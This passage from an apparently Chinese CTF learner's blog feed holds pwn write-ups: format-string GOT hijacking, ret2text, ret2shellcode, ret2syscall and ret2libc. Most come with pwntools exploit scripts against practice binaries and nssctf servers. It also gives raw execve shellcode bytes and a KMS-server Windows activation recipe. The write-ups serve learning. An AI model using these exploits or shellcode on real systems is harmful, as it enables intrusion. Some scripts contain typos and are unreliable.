class="string">'node5.anna.nssctf.cn'</span>, <span class="number">22555</span>)</span><br><span class="line"><span class="comment">#io = process('./pwn1')</span></span><br><span class="line">io.recvuntil(<span class="string">b'&gt; '</span>)</span><br><span class="line">io.sendline(<span class="string">b'3'</span>)</span><br><span class="line">io.sendline(<span class="string">b'0'</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b'&gt; '</span>)</span><br><span class="line">io.sendline(<span class="string">b'3'</span>)</span><br><span class="line">io.sendline(<span class="string">b'0'</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b'&gt; '</span>)</span><br><span class="line">io.sendline(<span class="string">b'2'</span>)</span><br><span class="line">io.sendline(<span class="string">b'1'</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b'&gt; '</span>)</span><br><span class="line">io.sendline(<span class="string">b'1'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="格式化字符串-got劫持"><a href="#格式化字符串-got劫持" class="headerlink" title="格式化字符串-got劫持"></a>格式化字符串-got劫持</h1><p>checksec<br><img src="/2024/07/10/nssctf/babyfmt_1.png"><br>32位，开启NX</p><p>丢到ida<br><img src="/2024/07/10/nssctf/babyfmt_2.png"><br>有后门函数<br><img src="/2024/07/10/nssctf/babyfmt_3.png"><br>可以利用格式化字符串，劫持printf的got表为后门函数的地址，从而拿到shell</p><p>exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'node5.anna.nssctf.cn'</span>, <span class="number">26146</span>)</span><br><span class="line"><span class="comment">#io = process('./babyfmt')</span></span><br><span class="line">elf = ELF(<span class="string">'./babyfmt'</span>)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">offset = <span class="number">11</span></span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">backdoor_addr = elf.sym[<span class="string">'backdoor'</span>]</span><br><span class="line">payload = fmtstr_payload(offset, {printf_got: backdoor_addr})</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个wp和linux文件描述符及重定向</title>
      <link href="/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/"/>
      <url>/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/</url>
      
        <content type="html"><![CDATA[<p>在做题过程中遇到了好几次重定向，在此简单了解一下。<span id="more"></span></p><p>checksec一下<br><img src="/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/vuln_1.png"><br>64位，开启了NX</p><p>丢到ida里<br><img src="/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/vuln_2.png"><br>看到关闭了标准输出<br>并且存在栈溢出，又看到了后门函数<br><img src="/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/vuln_3.png"></p><p>exp如下  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'node5.anna.nssctf.cn'</span>,<span class="number">24144</span>)</span><br><span class="line"><span class="comment">#io = process('./vuln')</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./vuln'</span>)</span><br><span class="line"></span><br><span class="line">backdoor = elf.symbols[<span class="string">'b4ckd0or'</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401233</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span> + <span class="number">0x08</span>) + p64(ret) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">'exec 1&gt;&amp;0'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>打通<br><img src="/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/vuln_4.png"> </p><hr><ul><li>I/O重定向通常与FD有关，shell的FD通常为10个，即0～9</li><li>三个常用FD(默认与keyboard、monitor、monitor有关)</li></ul><table><thead><tr><th>FD</th><th>说明</th></tr></thead><tbody><tr><td>0</td><td>stdin，标准输入</td></tr><tr><td>1</td><td>stdout，标准输出</td></tr><tr><td>2</td><td>stderr，标准错误输出</td></tr></tbody></table><p>0是标准输入，1是标准输出，2是标准错误。如果此时再打开一个新的文件，它的文件描述符就是3。<br>用 &lt; 来改变读进的数据信道(stdin)，使之从指定的档案读进<br>用 &gt; 来改变送出的数据信道(stdout, stderr)，使之输出到指定的档案</p><p>我们可以修改文件描述符的指向，也就是重定向，例如：exec 1&gt;myputout，而exp中的exec 1&gt;&amp;0，将标准输出重定位到标准输入上，这样就相当于重新启动了标准输出。</p><p>参考文章：<a href="https://xstarcd.github.io/wiki/shell/exec_redirect.html">https://xstarcd.github.io/wiki/shell/exec_redirect.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win11pro激活</title>
      <link href="/2024/06/13/win11pro%E6%BF%80%E6%B4%BB/"/>
      <url>/2024/06/13/win11pro%E6%BF%80%E6%B4%BB/</url>
      
        <content type="html"><![CDATA[<p>激活win11pro <span id="more"></span></p><p>出现类似下面的问题<br><img src="/2024/06/13/win11pro%E6%BF%80%E6%B4%BB/%E9%97%AE%E9%A2%98.png"></p><p>解决：</p><p>打开注册表找到如下路径修改SkioRearm<br><img src="/2024/06/13/win11pro%E6%BF%80%E6%B4%BB/Snipaste_2024-06-13_12-01-30.png"></p><p><img src="/2024/06/13/win11pro%E6%BF%80%E6%B4%BB/Snipaste_2024-06-13_12-01-42.png"></p><p>将0修改为1</p><p>管理员终端运行  </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">slmgr /skms kms.org</span><br><span class="line">slmgr /ato</span><br><span class="line"> </span><br><span class="line">(上面两个不行，运行的下面三行成功！)</span><br><span class="line"> </span><br><span class="line">slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX</span><br><span class="line">slmgr /skms kms.03k.org</span><br><span class="line">slmgr /ato</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 解决问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LibcSearcher 报错</title>
      <link href="/2024/03/24/LibcSearcher-%E6%8A%A5%E9%94%99/"/>
      <url>/2024/03/24/LibcSearcher-%E6%8A%A5%E9%94%99/</url>
      
        <content type="html"><![CDATA[<p>在LibcSearcher更新时，会报错。<span id="more"></span></p><p>LibcSearcher报错Requirements for download or update ubuntu are not met. Please, refer to README.md for installation instructions</p><p>需要安装zstd</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install zstd</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 解决问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>较短的shellcode</title>
      <link href="/2024/03/08/%E8%BE%83%E7%9F%AD%E7%9A%84shellcode/"/>
      <url>/2024/03/08/%E8%BE%83%E7%9F%AD%E7%9A%84shellcode/</url>
      
        <content type="html"><![CDATA[<p>较短的shellcode <span id="more"></span></p><p>32位（21字节）<br>\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</p><p>64位（23字节）<br>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f \x05</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LibcSearcher_update</title>
      <link href="/2024/02/29/LibcSearcher-update/"/>
      <url>/2024/02/29/LibcSearcher-update/</url>
      
        <content type="html"><![CDATA[<p>更新LIbcSearcher <span id="more"></span></p><ol><li><pre><code>cd LibcSearcherrm -rf libc-databasegit clone https://github.com/niklasb/libc-database.git</code></pre></li><li><p>cd libc-database执行./get</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 解决问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu22.04连不上网</title>
      <link href="/2024/02/06/ubuntu22-04%E8%BF%9E%E4%B8%8D%E4%B8%8A%E7%BD%91/"/>
      <url>/2024/02/06/ubuntu22-04%E8%BF%9E%E4%B8%8D%E4%B8%8A%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<p>我的ubuntu22.04老是无缘无故连不上网。<span id="more"></span></p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo service NetworkManager stop </span><br><span class="line"> </span><br><span class="line">sudo rm /var/lib/NetworkManager/NetworkManager.state </span><br><span class="line"> </span><br><span class="line">sudo service NetworkManager start</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 解决问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些pwn</title>
      <link href="/2023/12/05/some-small-pwn-topics/"/>
      <url>/2023/12/05/some-small-pwn-topics/</url>
      
        <content type="html"><![CDATA[<p>……<span id="more"></span></p><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>checksec<br><img src="/2023/12/05/some-small-pwn-topics/ret2text0.png"><br>32位，未开启canary，开启了NX<br>丢到ida里面看一下<br><img src="/2023/12/05/some-small-pwn-topics/ret2text1.png"></p><p>可以看到vulnerable函数里有gets函数，读到的值传到buffer里，距离ebp16个字节写exp<br>看到getshell函数首地址为<br><img src="/2023/12/05/some-small-pwn-topics/ret2text2.png"></p><p><img src="/2023/12/05/some-small-pwn-topics/ret2text3.png"></p><p><img src="/2023/12/05/some-small-pwn-topics/ret2text4.png"></p><p>打通。</p><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p>checksec一下<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode0.png"><br>32位文件，未开启canary保护，未开启PIE，具有RWX段。</p><p>丢到ida<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode1.png"><br>定义了一个字符型数组s，gets输入到s，并将s的0x64位字节数据赋给buf2</p><p>在gdb中发现gets函数的栈帧长度为0x92字，esp存储的是一个指针，可以看到数据是从0xffffd01c开始填充<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode2.png"><br>通过python可以算出需要填充108 + 4 个垃圾字节，再加4个字节的数据——返回地址<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode3.png"></p><p>找到全局变量buf2的地址<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode4.png"></p><p>写脚本  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2shellcode"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())  </span><br><span class="line"><span class="comment"># asm()将参数转化为机器码， shellcraft.sh()默认生成一个面向x86的shellcode</span></span><br><span class="line">buf2_addr = <span class="number">0x0804a080</span></span><br><span class="line">io.senline = (shellcode.ljust(<span class="number">112</span>, <span class="string">b'A'</span>) + p32(buf2_addr))</span><br><span class="line"><span class="comment"># ljust()从左向右调整填充A至112</span></span><br><span class="line">io.interactive()             </span><br></pre></td></tr></tbody></table></figure><p>得到了本地程序的shell<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode5.png"></p><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>checksec<br><img src="/2023/12/05/some-small-pwn-topics/ret2syscall0.png"><br>看到32位程序，开启了RELRO<br>no ret2text no ret2shellcode<br>丢到ida里<br><img src="/2023/12/05/some-small-pwn-topics/ret2syscall1.png"></p><p>看到gets()函数<br>v4与ebp相距0x64 = 100<br>gdb动态调试一下<br><img src="/2023/12/05/some-small-pwn-topics/ret2syscall5.png">  </p><p>看到填充位置与ebp相差0xa8 - 0x3c = 108<br>所以有时候ida也不太准<br>基本ROP，ret2syscall，通过gadgets构成代码拿到shell<br><img src="/2023/12/05/some-small-pwn-topics/ret2syscall2.png"><br>用ROPgadget搜索到如下gadgets<br><img src="/2023/12/05/some-small-pwn-topics/ret2syscall3.png">  </p><p><img src="/2023/12/05/some-small-pwn-topics/ret2syscall4.png"></p><p><img src="/2023/12/05/some-small-pwn-topics/ret2syscall7.png"></p><p><img src="/2023/12/05/some-small-pwn-topics/ret2syscall6.png"></p><p>写exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2syscall"</span>)</span><br><span class="line">pop_eax = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">bin_sh = <span class="number">0x080BE408</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line">payload = flat([<span class="string">b'A'</span>*(<span class="number">108</span> + <span class="number">4</span>), pop_eax, <span class="number">0xb</span>, pop_edx_ecx_ebx, <span class="number">0</span>, <span class="number">0</span>, bin_sh, int_80 ])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/12/05/some-small-pwn-topics/ret2syscall8.png"></p><p>打通！</p><p>tip：  </p><blockquote><p>在笔者学习这个payload时，疑惑0xb为什么可以直接传递，搜集了一下信息，以后慢慢学。（doge）</p><p>在这个栈溢出攻击中，<code>0xb</code> 和 <code>"/bin/sh"</code> 之间的区别涉及到系统调用号和字符串的存储方式。</p><ol><li><strong>系统调用号（syscall number）：</strong></li></ol><ul><li><code>0xb</code> 是系统调用号，对应于 <code>execve</code> 系统调用。在x86体系结构中，<code>0xb</code> 对应于 <code>sys_execve</code>。</li><li>系统调用号通常直接作为参数传递给EAX寄存器，因此可以直接放在ROP链中。</li></ul><ol start="2"><li><strong>字符串 “/bin/sh”：</strong></li></ol><ul><li><code>"/bin/sh"</code> 是一个字符串，存储在内存中的某个位置。在ROP攻击中，我们需要将该字符串的地址传递给 <code>execve</code> 系统调用的参数之一。</li><li>字符串本身的内容不适合直接放在ROP链中，因为ROP链需要是一系列的地址。所以我们将字符串的地址放在ROP链中，然后 <code>execve</code> 在执行时会读取该地址处的字符串。</li></ul></blockquote><h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h1><p>checksec<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc10.png"><br>32位程序，未开启canary，未开启PIE，开启了栈不可执行。<br>丢到ida里<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc11.png"><br>发现危险函数gets()<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc12.png"><br>函数secure()有一个system()函数但是命令”shell!?”没有任何作用，但是由于system()函数的调用，在plt表里会有system()函数对应的got表地址的表项，进而能解析出system()函数的真实地址，从而调用system()函数。</p><p><img src="/2023/12/05/some-small-pwn-topics/ret2libc13.png"></p><p>需要填充108 + 4 = 112个垃圾数据<br>写exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">system_addr = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line"><span class="comment"># payload = b"a" * 112 + p32(system_addr) + b"aaaa" + p32(bin_sh_addr)</span></span><br><span class="line">payload = flat([<span class="string">b"a"</span>*<span class="number">112</span>, system_addr, <span class="string">b"aaaa"</span>, bin_sh_addr])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/12/05/some-small-pwn-topics/ret2libc14.png"></p><p>打通！</p><h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h1><p>checksec<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc20.png"><br>32位程序，未开启了canary和PIE，开启了部分RELRO和栈不可执行。</p><p>没有后门函数，也没有足够的gadgets。</p><p>没有找到”/bin/sh”<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc21.png"><br><img src="/2023/12/05/some-small-pwn-topics/ret2libc22.png"><br>在全局区找到了全局变量buf2，可以劫持程序流到buf2写入”/bin/sh”再进行ROP</p><p>payload的结构如下<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc23.png"><img src="/2023/12/05/some-small-pwn-topics/ret2libc24.png"></p><p>要填充0x78 - 0x0c + 4 = 108 + 4 = 112个垃圾数据<br>写exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">system_addr = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">gets_addr = elf.plt[<span class="string">"gets"</span>]</span><br><span class="line">buf2_addr = <span class="number">0x0804A080</span></span><br><span class="line">payload = flat([<span class="string">b"a"</span>*<span class="number">112</span>, gets_addr, system_addr, buf2_addr, buf2_addr])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p> <img src="/2023/12/05/some-small-pwn-topics/ret2libc25.png"></p><p>打通！</p><h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1><p>看到有两个文件</p><p>checksec ret2libc3<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc30.png"><br>32位，未开启canary和PIE</p><p>丢到ida里<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc31.png"><br>没有找到后门函数，又没有RWX段无法ret2text和ret2shellcode，而且没有足够的gadget所以也无法用ret2syscall，只能用ret2libc。<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc32.png"><br>栈溢出漏洞在第二个read</p><p>栈结构如下<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc33.png"></p><p>此处笔者遇到一个问题，题中给的libc文件和实际程序的所用的libc文件不一样所以分析题中所给的libc文件是无法打通的，可以利用ldd -v ret2libc3来查看程序所用的libc文件<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc36.png"><br>可以看到所用的libc为<code>libc.so.6</code>其路径为<code>/lib/i386-linux-gnu/libc.so.6</code><br>写exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">"i386"</span>, os = <span class="string">"linux"</span>, log_level = <span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line">puts_address = elf.got[<span class="string">b"puts"</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>, <span class="built_in">str</span>(puts_address))</span><br><span class="line">io.recvuntil(<span class="string">b" : "</span>)</span><br><span class="line">puts_address_real = <span class="built_in">int</span>(io.recvuntil(<span class="string">b"\n"</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libbase = puts_address_real - libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">system_address = libc.symbols[<span class="string">"system"</span>] + libbase</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">success(<span class="string">"system_address -&gt; {:#x}"</span>.<span class="built_in">format</span>(system_address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">payload = flat(cyclic(<span class="number">60</span>), system_address, <span class="string">"aaaa"</span>, <span class="built_in">next</span>(elf.search(<span class="string">b"sh\x00"</span>)))</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>打通！</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初探ELF</title>
      <link href="/2023/12/01/first-exploration-ELF/"/>
      <url>/2023/12/01/first-exploration-ELF/</url>
      
        <content type="html"><![CDATA[<p>浅浅地了解下ELF文件，以后会从多个角度反复阐述。<span id="more"></span></p><p><img src="/2023/12/01/first-exploration-ELF/elf.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>32位传参 VS 64位传参</title>
      <link href="/2023/11/20/i386-VS-AMD64/"/>
      <url>/2023/11/20/i386-VS-AMD64/</url>
      
        <content type="html"><![CDATA[<p>对32位传参和64位传参的比较<span id="more"></span></p><blockquote><p>i386=Intel 80386。其实i386通常被用来作为对Intel（英特尔）32位微处理器的统称。<br>AMD64，又称“x86-64”或“x64”，是一种64位元的电脑处理器架构。它是建基于现有32位元的x86架构，由AMD公司所开发。</p></blockquote><p>2位使用栈帧（栈帧是指函数在被调用时，所拥有的一块独立的用于存放函数所使用的状态和变量的栈空间。 每个函数都对应有一个栈帧。 同一个函数多次进入，每次可能会分配到不同的栈帧。 整个栈的内容在同一个时刻可以看作是由许多栈帧依序“堆叠”组成的。）来作为传递的参数的保存位置，而64位使用寄存器，分别用rdi,rsi,rdx,rcx,r8,r9作为第1-6个参数，当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。rax作为返回值 64位没有栈帧的指针，32位用ebp作为栈帧指针，64位取消了这个设定，rbp作为通用寄存器使用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf_pwn_wp</title>
      <link href="/2023/11/18/buuctf-pwn-wp/"/>
      <url>/2023/11/18/buuctf-pwn-wp/</url>
      
        <content type="html"><![CDATA[<p>记录一些pwn题wp<span id="more"></span></p><h1 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h1><p>测试nc， ls 看到有flag， cat flag得到flag。<br><img src="/2023/11/18/buuctf-pwn-wp/test_your_nc.png">  </p><blockquote><p>nc是<a href="https://so.csdn.net/so/search?q=netcat&amp;spm=1001.2101.3001.7020">netcat</a>的简写</p><p>（1）实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口<br>（2）端口的扫描，nc可以作为client发起TCP或UDP连接<br>（3）机器之间传输文件<br>（4）机器之间网络测速</p></blockquote><p><code>nc [-hlnruz][-g&lt;网关...&gt;][-G&lt;指向器数目&gt;][-i&lt;延迟秒数&gt;][-o&lt;输出文件&gt;][-p&lt;通信端口&gt;][-s&lt;来源位址&gt;][-v...][-w&lt;超时秒数&gt;][主机名称][通信端口...]</code></p><h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><p>拖到ida里面看一下，发现有一个危险函数get ，它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出。顺便也知道了15个字节的存储空间，那么在栈帧中系统就会给我们分配一个15个字节的存储空间<br><img src="/2023/11/18/buuctf-pwn-wp/rip.png"><br>fun函数里面发现了system函数，system是c语言下的一个可以执行shell命令的函数，目前可以简单理解为，执行了这个危险函数，我们就拿到了远端服务器的shell，也就是相当于在windows下以管理员身份开启cmd，那么我们就可以通过一系列后续指令控制远端服务器。<br><img src="/2023/11/18/buuctf-pwn-wp/rip1.png"><br>编写脚本<br><img src="/2023/11/18/buuctf-pwn-wp/rip2.png"><br>ls 看到flag的文件，cat flag<br><img src="/2023/11/18/buuctf-pwn-wp/rip3.png"></p><h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p><img src="/2023/11/18/buuctf-pwn-wp/warmup_csaw_2016%201.png"><br>64位文件，而且没有开启保护<br>拖进ida<br><img src="/2023/11/18/buuctf-pwn-wp/warm2.png"><br> <img src="/2023/11/18/buuctf-pwn-wp/warm4.png"><br>发现危险函数_gets，还看到了system函数<br>编写payload脚本<br><img src="/2023/11/18/buuctf-pwn-wp/warmup4.png"><br><img src="/2023/11/18/buuctf-pwn-wp/warm3.png"></p><hr><h1 id="第二周"><a href="#第二周" class="headerlink" title="第二周"></a>第二周</h1><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><p><img src="/2023/11/18/buuctf-pwn-wp/2019.png"><br>发现开启了NX，无法用shellcode<br>丢到ida  </p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 